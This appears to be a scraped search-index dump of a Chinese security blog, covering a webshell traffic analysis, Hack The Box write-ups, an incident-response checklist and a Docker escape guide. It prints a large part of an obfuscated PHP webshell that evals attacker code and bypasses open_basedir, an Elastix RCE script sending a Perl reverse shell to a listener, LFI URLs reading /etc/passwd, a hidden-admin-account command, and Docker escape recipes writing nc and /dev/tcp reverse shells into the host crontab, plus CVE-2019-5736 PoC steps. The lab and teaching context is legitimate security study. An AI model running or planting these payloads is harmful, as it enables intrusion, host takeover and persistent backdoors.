@session_write_close(); if (canCallGzipDecode()==1\u0026\u0026@isGzipStream($pms)){ $pms=gzdecode($pms); } formatParameter($pms); if (isset($_SES[\"bypass_open_basedir\"])\u0026\u0026$_SES[\"bypass_open_basedir\"]==true){ @bypass_open_basedir(); } $result=evalFunc(); if ($_SES!==null){ session_start(); $_SESSION[$sessioId]=base64_encode(S1MiwYYr(serialize($_SES),$sessioId)); @session_write_close(); } if (canCallGzipEncode()){ $result=gzencode($result,6); } return $result; } function S1MiwYYr($D,$K){ for($i=0;$i\u003cstrlen($D);$i++) { $D[$i] = $D[$i]^$K[($i+1)%15]; } return $D; } function reDefSystemFunc(){ if (!function_exists(\"file_get_contents\")) { function file_get_contents($file) { $f = @fopen($file,\"rb\"); $contents = false; if ($f) { do { $contents .= fgets($f); } while (!feof($f)); } fclose($f); return $contents; } } if (!function_exists('gzdecode')\u0026\u0026function_existsEx(\"gzinflate\")) { function gzdecode($data) { return gzinflate(substr($data,10,-8)); } } } function \u0026getSession(){ global $_SES; return $_SES; } function bypass_open_basedir(){ @$_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']); $allFiles = @scandir($_FILENAME); $cdStatus=false; if ($allFiles!=null){ foreach ($allFiles as $fileName) { if ($fileName!=\".\"\u0026\u0026$fileName!=\"..\"){ if (@is_dir($fileName)){ if (@chdir($fileName)===true){ $cdStatus=true; break; } } } } } if(!@file_exists('bypass_open_basedir')\u0026\u0026!$cdStatus){ @mkdir('bypass_open_basedir'); } if (!$cdStatus){ @chdir('bypass_open_basedir'); } @ini_set('open_basedir','..'); @$_FILENAME = @dirname($_SERVER['SCRIPT_FILENAME']); @$_path = str_replace(\"\\\\\",'/',$_FILENAME); @$_num = substr_count($_path,'/') + 1; $_i = 0; while($_i \u003c $_num){ @chdir('..'); $_i++; } @ini_set('open_basedir','/'); if (!$cdStatus){ @rmdir($_FILENAME.'/'.'bypass_open_basedir'); } } function formatParameter($pms){ global $parameters; $index=0; $key=null; while (true){ $q=$pms[$index]; if (ord($q)==0x02){ $len=bytesToInteger(getBytes(substr($pms,$index+1,4)),0); $index+=4; $value=substr($pms,$index+1,$len); $index+=$len; $parameters[$key]=$value; $key=null; }else{ $key.=$q; } $index++; if ($index\u003estrlen($pms)-1){ break; } } } function evalFunc(){ try{ @session_write_close(); $className=get(\"codeName\"); $methodName=get(\"methodName\"); $_SES=\u0026getSession(); if ($methodName!=null){ if (strlen(trim($className))\u003e0){ if ($methodName==\"includeCode\"){ return includeCode(); }else{ if (isset($_SES[$className])){ return eval($_SES[$className]); }else{ return \"{$className}no load\"; } } }else{ if (function_exists($methodName)){ return $methodName(); }else{ return \"function {$methodName}not exist\"; } } }else{ return \"methodName Is Null\"; } }catch (Exception $e){ return \"ERROR://\".$e -\u003e getMessage(); } } function deleteDir($p){ $m=@dir($p); while(@$f=$m-\u003eread()){ $pf=$p.\"/\".$f; @chmod($pf,0777); if((is_dir($pf))\u0026\u0026($f!=\".\")\u0026\u0026($f!=\"..\")){ deleteDir($pf); @rmdir($pf); }else if (is_file($pf)\u0026\u0026($f!=\".\")\u0026\u0026($f!=\"..\")){ @unlink($pf); } } $m-\u003eclose(); @chmod($p,0777); return @rmdir($p); } function deleteFile(){ $F=get(\"fileName\"); i","date":"2021-03-28","objectID":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:3:0","tags":["渗透测试"],"title":"webshell 流量分析","uri":"/2021/03/webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["靶场"],"content":"Hack the box - Delivery","date":"2021-03-22","objectID":"/2021/03/hackthebox-delivery/","tags":["HTB"],"title":"Hack the box - Delivery","uri":"/2021/03/hackthebox-delivery/"},{"categories":["靶场"],"content":"Hack The Box - Delivery ","date":"2021-03-22","objectID":"/2021/03/hackthebox-delivery/:0:0","tags":["HTB"],"title":"Hack the box - Delivery","uri":"/2021/03/hackthebox-delivery/"},{"categories":["靶场"],"content":"信息收集 nmap -T4 -A 10.10.10.222 目标机器开放 22、80 等端口。 访问 80 端口，点击 CONTACT US： 该页面发现两处域名：helpdesk.delivery.htb 和 delivery.htb 将上述两个域名添加到 hosts 文件中，进行下一步测试。 ","date":"2021-03-22","objectID":"/2021/03/hackthebox-delivery/:1:0","tags":["HTB"],"title":"Hack the box - Delivery","uri":"/2021/03/hackthebox-delivery/"},{"categories":["靶场"],"content":"漏洞利用 http://helpdesk.delivery.htb/index.php 上新建一个工单： 得到一个邮箱和工单 ID。 利用该邮箱，在 http://delivery.htb:8065/signup_email 注册账号： 创建账户后，发现需要邮箱验证，但是目前无法获取到注册认证的链接。 在 helpdesk.delivery.htb 上存在一个查看历史工单的链接，然后在 Check Ticket Status 中查看详细信息： 发现认证链接被发送到此处，点击该链接，进行账户确认，并登录后台： 在后台处发现 Server 的用户名和密码 maildeliverer:Youve_G0t_Mail! 和管理员留下的密码规则：PleaseSubscribe! SSH 登录： 获得 user 的 flag。 在 /opt/mattermost/config/ 下找到应用的 config 文件： 在文件中找到 mysql 的用户名与密码： 登录 mysql，寻找敏感信息： 发现 web 应用中 root 用户的密码 hash，猜测存在密码复用的情况，结合之前工单系统中留下的密码构造的线索，利用 hashcat 进行密码破解，得到密码明文为：PleaseSubscribe!21 SU 切换用户： 得到 root 用户的 flag。 ","date":"2021-03-22","objectID":"/2021/03/hackthebox-delivery/:2:0","tags":["HTB"],"title":"Hack the box - Delivery","uri":"/2021/03/hackthebox-delivery/"},{"categories":["靶场"],"content":"Hack the box - Beep","date":"2021-03-21","objectID":"/2021/03/hackthebox-beep/","tags":["HTB"],"title":"Hack the box - Beep","uri":"/2021/03/hackthebox-beep/"},{"categories":["靶场"],"content":"Hack The Box - Beep ","date":"2021-03-21","objectID":"/2021/03/hackthebox-beep/:0:0","tags":["HTB"],"title":"Hack the box - Beep","uri":"/2021/03/hackthebox-beep/"},{"categories":["靶场"],"content":"信息收集 nmap -T4 -A 10.10.10.7 80 端口为 Elastix 应用： 利用 searchsploit 寻找历史漏洞： ","date":"2021-03-21","objectID":"/2021/03/hackthebox-beep/:1:0","tags":["HTB"],"title":"Hack the box - Beep","uri":"/2021/03/hackthebox-beep/"},{"categories":["靶场"],"content":"漏洞利用 ","date":"2021-03-21","objectID":"/2021/03/hackthebox-beep/:2:0","tags":["HTB"],"title":"Hack the box - Beep","uri":"/2021/03/hackthebox-beep/"},{"categories":["靶场"],"content":"漏洞点一 发现一处 LFI 漏洞，尝试利用，寻找敏感信息： 发现用户名与密码：admin:jEhdIekWmdjE。 使用该密钥尝试登录，进入后台： 使用该密钥尝试登录 SSH： 发现密钥重用的问题，直接 getshell。 ","date":"2021-03-21","objectID":"/2021/03/hackthebox-beep/:2:1","tags":["HTB"],"title":"Hack the box - Beep","uri":"/2021/03/hackthebox-beep/"},{"categories":["靶场"],"content":"漏洞点二 发现历史漏洞库中一处 RCE 漏洞：https://www.exploit-db.com/exploits/18650 修改 payload，包括 rhost、lhost、lport、extension import urllib import ssl rhost=\"10.10.10.7\" lhost=\"10.10.14.7\" lport=4444 extension=\"233\" ctx = ssl.create_default_context() ctx.check_hostname = False ctx.verify_mode = ssl.CERT_NONE # Reverse shell payload url = 'https://'+str(rhost)+'/recordings/misc/callme_page.php?action=c\u0026callmenum='+str(extension)+'@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22'+str(lhost)+'%3a'+str(lport)+'%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A' urllib.urlopen(url, context=ctx) # On Elastix, once we have a shell, we can escalate to root: # root@bt:~# nc -lvp 443 # listening on [any] 443 ... # connect to [172.16.254.223] from voip [172.16.254.72] 43415 # id # uid=100(asterisk) gid=101(asterisk) # sudo nmap --interactive # Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) # Welcome to Interactive Mode -- press h \u003center\u003e for help # nmap\u003e !sh # id # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) SIP extension 在登录管理后台可以确定 ","date":"2021-03-21","objectID":"/2021/03/hackthebox-beep/:2:2","tags":["HTB"],"title":"Hack the box - Beep","uri":"/2021/03/hackthebox-beep/"},{"categories":["靶场"],"content":"漏洞点三 扫目录时发现 vtigercrm 目录，寻找历史漏洞，存在 LFI： https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00 同样可以包含 /etc/amportal.conf，获取密码信息。 此外，在 MSF 上同样有 vtigercrm 的漏洞： 使用 1 失败，使用 2 成功。 ","date":"2021-03-21","objectID":"/2021/03/hackthebox-beep/:2:3","tags":["HTB"],"title":"Hack the box - Beep","uri":"/2021/03/hackthebox-beep/"},{"categories":["渗透测试"],"content":"应急响应","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["渗透测试"],"content":"应急响应 ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:0:0","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["渗透测试"],"content":"1 Windows 应急响应 ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:1:0","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["渗透测试"],"content":"1.1 文件分析 1.1.1 开机启动项 利用操作系统中的启动菜单： C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 利用系统配置 msconfig： 利用注册表： HKCU\\software\\Microsoft\\Windows\\CurrentVersion\\Run HKLM\\software\\Microsoft\\Windows\\CurrentVersion\\Run 1.1.2 tmp 临时文件夹 使用 cmd，输入 %tmp%，直接打开临时文件夹 查看该文件夹下是否有可疑文件（exe、dll、sys） 1.1.3 浏览器历史记录 工具地址：https://launcher.nirsoft.net/downloads/index.html browsinghistoryview browserdownloadsview 1.1.4 文件属性分析 在 Windows 系统下，文件属性的时间属性具有：创建时间、修改时间、访问时间（默认情况下禁用）默认情况下，计算机是以修改时间作为展示。 如果修改时间要早于创建时间那么这个文件存在很大可疑。使用中国菜刀等工具修改的修改时间，通过文件属性可以查看到创建时间、修改时间、访问时间。 1.1.5 最近打开文件分析 Windows 系统中默认记录系统中最近打开使用的文件信息。 可以在目录 C:\\Documents and Settings\\Administrator\\Recent 下查看，也可以使用 win+R 打开运行，输入 %UserProfile%\\Recent 查看。然后利用 Windows 中的筛选条件查看具体时间范围的文件 ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:1:1","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["渗透测试"],"content":"1.2 进程分析 1.2.1 可疑进程发现与关闭 计算机与外部网络通信是建立在 TCP 或 UDP 协议上的，并且每一次通信都是具有不同的端口（0~65535）。如果计算机被木马后，肯定会与外部网络通信，那么此时就可以通过查看网络连接状态，找到对应的进程 ID，然后关闭进程 ID 就可以关闭连接状态。 # 查看网络建立连接状态 netstat -ano | find \"ESTABLISHED\" # 查看具体 PID 进程对应的程序 tasklist /svc | find \"PID\" taskill /PID pid值 /T 关闭进程 1.2.2 Window 计划任务 在计算机中可以通过设定计划任务，在固定时间执行固定操作。一般情况下，恶意代码也有可能在固定的时间设置执行。 使用 at 或 schtasks 命令可以对计划任务进行管理，直接输入 at 可以查看当前计算机中保存的计划任务。 也可以在计划任务程序中打开： 1.2.3 隐藏账户发现与删除 隐藏账号，是指“黑客”入侵之后为了能够持久保持对计算机访问，而在计算机系统中建立的不轻易被发现的计算机账户。 最为简单的隐藏账户建立： net user test$ test /add \u0026\u0026 net localgroup administrator test$ /add 其中 $ 符号可以导致系统管理员在使用 net user 时无法查看到 test$ 用户。 ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:1:2","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["渗透测试"],"content":"1.3 系统信息 1.3.1 补丁查看与更新 Windows 系统支持补丁以修补漏洞。可以使用 systeminfo 查看系统信息，并展示对应的系统补丁信息编号。 也可以在卸载软件中查看系统补丁和第三方软件补丁。 ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:1:3","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["渗透测试"],"content":"1.4 webshell 查杀 常见工具：D 盾 ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:1:4","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["渗透测试"],"content":"2 linux 分析排查 ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:0","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["渗透测试"],"content":"2.1 文件分析 2.1.1 tmp 目录 在 Linux 系统下一切都是文件。其中 /tmp 是一个特别的临时目录文件。每个用户都可以对它进行读写操作。因此一个普通用户可以对 /tmp目录执行读写操作。 2.1.2 开机启动项 查看开机启动项内容 /etc/init.d/，恶意代码很有可能设置在开机自启动的位置。 查看指定目录下文件时间顺序的排序：Is-alt| head -n 10 查看文件时间属性：stat 文件名 使用 update-rc.d 程序名称 enable 设置开机自启 使用 update-rc.d 程序名称 disable 禁止开机自启 2.1.3 文件修改时间搜索 新增文件分析： 查找 24 小时内被修改的文件 find ./ -mtime 0 -name \"*.php\" 查找 72 小时内新增的文件 find ./ -ctime -2 -name \"*.php\" 权限查找 find ./ -iname \"*.php\" -perm 777 -iname 忽略大小写，-perm 筛选文件权限 ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:1","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["渗透测试"],"content":"2.2 进程分析 2.2.1 网络连接分析 在 Linux 中可以使用 netstat 进行网络连接查看。 netstat -Print network connections, routing tables, interface statistics, masquerade connections, and multicast memberships 常用命令 netstat -pantl 查看处于 tcp 网络套接字相关信息。 关闭未知连接 kill -9 PID 即可。 2.2.2 进程对应的文件 在 linux 中可以使用 ps 查看进程相关信息 使用 ps aux 查看所有进程信息 使用 ps -aux| grep PID 筛选出具体 PID 的进程信息，lsof -i：端口号也可以实现类似功能 ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:2","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["渗透测试"],"content":"2.3 登录分析 在 Linux 做的操作都会被记录到系统日志中，对于登录也可以查看日志信息查看是否有异常登录。last 命令 last -i | grep -v 0.0.0.0 查看登录日志，筛选非本地登录。 w 命令实时查看登录用户 ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:3","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["渗透测试"],"content":"2.4 异常用户的分析排查 在 Linux 中 root 用户是一个无敌的存在，可以在 Linux 上做任何事情。 新建用户 useradd username 设置密码 passwd username 输出密码 设置用户 uid 和 gid 都为 0。（root 用户 uid 为 0 gid 为 0）修改文件即可 /etc/passwd cat /etc/passwd grep \"0:0\" /etc/passwd ls -l /etc/passwd awk -F: '$3==0 {print $1}' /etc/passwd awk -F：'$2==\"！”{print $1}' /etc/shadow 或 awk -F：'length（$2）==0 {print $1}' /etc/shadow ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:4","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["渗透测试"],"content":"2.5 历史命令分析 在 Linux 系统中默认会记录之前执行的命令 /root/bash history 文件中。 用户可以使用 cat /root/.bash_history 进行查看或者使用 history 命令进行查看 ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:5","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["渗透测试"],"content":"2.6 计划任务排查 在 Linux 系统中可以使用命令 crontab 进行计划任务的设定 其中 -e 可以用来编辑设定计划任务，-l 可以用来查看当前计划任务，-d 用来删除计划任务。特别注意计划任务中未知内容 ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:6","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["渗透测试"],"content":"2.7 异常 $PAHT 环境变量的排查 环境变量决定了 shell 将到哪些目录中寻找命令或程序，PATH 的值是一系列目录，当您运行一个程序时，Linux 在这些目录下进行搜寻编译链接。 修改 PATH ： export PATH=$PATH:/usr/locar/new/bin # 本次终端中有效，重启后无效。 # 在 /etc/profile或/home/.bashrc（source ~/.bashrc）才能永久生效。 ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:7","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["渗透测试"],"content":"2.8 后门自动排查 - rkhunter Rkhunter 具有以下功能： 系统命令检测，MD5 校验 Rookit 检测 本机敏感目录、系统配置异常检测 安装：apt install rkhunter 基本使用： rkhunter -check-sk -c,--check # Check the local system -sk --skip-keypress # Don't wait for a keypress after each test ","date":"2021-03-07","objectID":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:8","tags":["渗透测试","应急响应"],"title":"应急响应","uri":"/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["云原生安全"],"content":"Docker 逃逸相关总结","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/","tags":["云原生安全","Docker"],"title":"Docker 逃逸相关总结","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["云原生安全"],"content":"Docker 逃逸相关总结 ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:0:0","tags":["云原生安全","Docker"],"title":"Docker 逃逸相关总结","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["云原生安全"],"content":"1 Docker 核心技术 Docker 是一个开源的应用容器引擎，可以让开发者打包任何应用以及依赖包到容器中，然后发布到任何流行的 Linux 机器上，完美的解决了测试环境与生产环境的某些不一致性问题。相比于传统的虚拟化技术， Docker 容器直接使用宿主机内核，也不存在硬件的虚拟，要轻便许多。 Docker 自出现后便经常与虚拟机做比较，有些人甚至认为 Docker 就是一种虚拟机。虚拟机总的来说是利用 Hypervisor 虚拟出内存、CPU等等。 我们来看一张图：我们把图中的矩形看作一个计算机，内部的圆圈看作一个又一个的进程，它们使用着相同的计算机资源，并且相互之间可以看到。 Docker 做了什么事呢？Docker 给它们加了一层壳，使它们隔离开来，此时它们之间无法相互看到，但是它们仍然运行在刚刚的环境上，使用着与刚刚一样的资源。我们可以理解为，它们与加壳之前的区别就是无法相互交流了。需要说一句的是，这个壳我们可以将它看作一个单向的门，外部可以往内走，但是内部却不能往外走。这在计算机中的意思就是，外部进程可以看到内部进程，但是内部进程却不能看到外部进程。 ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:1:0","tags":["云原生安全","Docker"],"title":"Docker 逃逸相关总结","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["云原生安全"],"content":"1.1 namespace 命名空间 (namespaces) 是 Linux 为我们提供的用于分离进程树、网络接口、挂载点以及进程间通信等资源的方法，是内核级别的环境隔离。在实际的运行过程中，多个服务之间的状态或资源是会相互影响的，每一个服务都能看到其它服务的进程，也可以访问宿主机器上的任意文件，而 docker 的目的是同一台机器上的不同服务能做到完全隔离，就像运行在多台不同的机器上一样，对此就需要在创建进程的时候指定 namespaces 来实现。 Linux 的命名空间机制提供了以下七种不同的命名空间，包括 CLONE_NEWCGROUP、CLONE_NEWIPC、CLONE_NEWNET、CLONE_NEWNS、CLONE_NEWPID、CLONE_NEWUSER 和 CLONE_NEWUTS，通过这七个选项我们能在创建新的进程时设置新进程应该在哪些资源上与宿主机器进行隔离。 由以上可知，Docker 并没有使用任何虚拟化技术，其就是一种隔离技术。如果你对 Linux 命令比较熟悉，甚至可以理解为 Docker 是一种高级的 chroot。 ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:1:1","tags":["云原生安全","Docker"],"title":"Docker 逃逸相关总结","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["云原生安全"],"content":"1.2 docker 安全机制 因为 Docker 所使用的是隔离技术，使用的仍然是宿主机的内核、CPU、内存，那会不会带来一些安全问题？答案是肯定的，那 Docker 是怎么防护的？ Docker 的安全机制有很多种：Linux Capability、AppArmor、SELinux、Seccomp 等等，本文主要讲述一下 Linux Capability 因为 Docker 默认对 User Namespace 未进行隔离，在 Docker 内部查看 /etc/passwd 可以看到 uid 为 0，也就是说，Docker 内部的 root 就是宿主机的 root。但是如果你使用一些命令，类似 iptables -L，会提示你权限不足。 这是由 Linux Capability 机制所实现的。自 Linux 内核 2.1 版本后，引入了 Capability 的概念，它打破了操作系统中超级用户/普通用户的概念，由普通用户也可以做只有超级用户可以完成的操作。 Linux Capability 一共有 38 种，分别对应着一些系统调用，Docker 默认只开启了 14 种。这样就避免了很多安全的问题。熟悉 Docker 操作的人应该可以意识到，在开启 Docker 的时候可以加一个参数是 --privileged=true，这样就相当于开启了所有的 Capability。使用 docker inspect {container.id} 在 CapAadd 项里可以看到添加的 capability。 ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:1:2","tags":["云原生安全","Docker"],"title":"Docker 逃逸相关总结","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["云原生安全"],"content":"2 判断是否在 Docker 容器中 首先，我们需要先判断是否在 Docker 环境里，常用的两个检测方式： 检查 /.dockerenv 文件是否存在 检查 /proc/1/cgroup 内是否包含 Docker 等字符串。 目前来说，这两种检测方式还是比较有效的，其他检测方式，如检测mount、fdisk -l 查看硬盘 、判断 PID 1 的进程名等也可用来辅助判断。 ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:2:0","tags":["云原生安全","Docker"],"title":"Docker 逃逸相关总结","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["云原生安全"],"content":"3 配置不当引发 Docker 逃逸 ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:3:0","tags":["云原生安全","Docker"],"title":"Docker 逃逸相关总结","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["云原生安全"],"content":"3.1 Docker Remote API 未授权访问 漏洞简述：Docker Remote API 可以执行 Docker 命令，Docker 守护进程监听在 0.0.0.0，可直接调用 API 来操作 Docker。 利用方法是，我们随意启动一个容器，并将宿主机的 /etc 目录挂载到容器中，便可以任意读写文件了。我们可以将命令写入 crontab 配置文件，进行反弹 shell。 EXP： import docker client = docker.DockerClient(base_url='http://your-ip:2375/') data = client.containers.run('alpine:latest', r'''sh -c \"echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' \u003e\u003e /tmp/etc/crontab\" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}}) ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:3:1","tags":["云原生安全","Docker"],"title":"Docker 逃逸相关总结","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["云原生安全"],"content":"3.2 docker.sock 挂载到容器内部 场景描述：简单来说就是 docker in docker，在 docker 容器中调用和执行宿主机的 docker，将 docker 宿主机的 docker 文件和 docker.sock 文件挂载到容器中，具体为： docker run --rm -it \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v /usr/bin/docker:/usr/bin/docker \\ ubuntu \\ /bin/bash 漏洞复现： 在容器中找到 docker.sock root@95a280bc5a19:/# find / -name docker.sock /run/docker.sock 在容器查看宿主机 docker 信息： docker -H unix:///var/run/docker.sock info 运行一个新容器并挂载宿主机根路径： docker -H unix:///var/run/docker.sock run -it -v /:/test ubuntu /bin/bash 在新容器的 /test 目录下，就可以访问到宿主机的全部资源，接下来就是写入 SSH 密钥或者写入计划任务，获取 shell。 ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:3:2","tags":["云原生安全","Docker"],"title":"Docker 逃逸相关总结","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["云原生安全"],"content":"3.3 Docker 高危启动参数 Docker 中存在一些比较高危的启动命令，给予容器较大的权限，允许执行一些特权操作，在一定的条件下，可以导致容器逃逸。 docker run --rm -it --privileged -v /:/soft --cap-add=SYS_ADMIN --net=host --pid=host --ipc=host ubuntu /bin/bash 特权模式 –privileged 使用特权模式启动的容器时，docker 管理员可通过 mount 命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。 通过特权模式运行一个容器： docker run -itd --privileged ubuntu:latest /bin/bash 在容器内，查看磁盘文件： fdisk -l 将 /dev/sda1 挂载到新建目录 mkdir /test mount /dev/sda1 /test 将计划任务写入到宿主机 echo '* * * * * /bin/bash -i \u003e\u0026 /dev/tcp/172.19.0.1/4444 0\u003e\u00261' \u003e\u003e /test/var/spool/cron/crontabs/root ","date":"2021-02-03","objectID":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/:3:3","tags":["云原生安全","Docker"],"title":"Docker 逃逸相关总结","uri":"/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/"},{"categories":["云原生安全"],"content":"3.4 Docker 软件设计引起的逃逸 3.4.1 CVE-2019-5736 CVE-2019-5736 是 runC 的 CVE 漏洞编号，runC 最初是作为 Docker 的一部分开发的，后来作为一个单独的开源工具和库被提取出来，在 docker 整个架构的运行过程中，Containerd 向 docker 提供运行容器的 API，二者通过 grpc 进行交互。containerd 最后通过 runc 来实际运行容器。 影响版本 docker version \u003c=18.09.2 RunC version \u003c=1.0-rc6 利用条件： 攻击者可控 image，进一步控制生成的 container 攻击者具有某已存在容器的写权限，且可通过 docker exec 进入 漏洞复现： 测试环境镜像下载安装 curl https://gist.githubusercontent.com/thinkycx/e2c9090f035d7b09156077903d6afa51/raw -o install.sh \u0026\u0026 bash install.sh 下载POC，修改脚本，编译 # 下载 poc git clone https://github.com/Frichetten/CVE-2019-5736-PoC # 修改Payload vi main.go payload = \"#!/bin/bash \\n bash -i \u003e\u0026 /dev/tcp/172.19.0.1/4444 0\u003e\u00261\" # 编译生成 payload CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go # 拷贝到 docker 容器中执行 docker cp ./main 248f8b7d3c45:/tmp 在容器中执行 payload： root@d1b112ea4a5e:/tmp# ./main [+] Overwritten /bin/sh successfully [+] Found the PID: 16 [+] 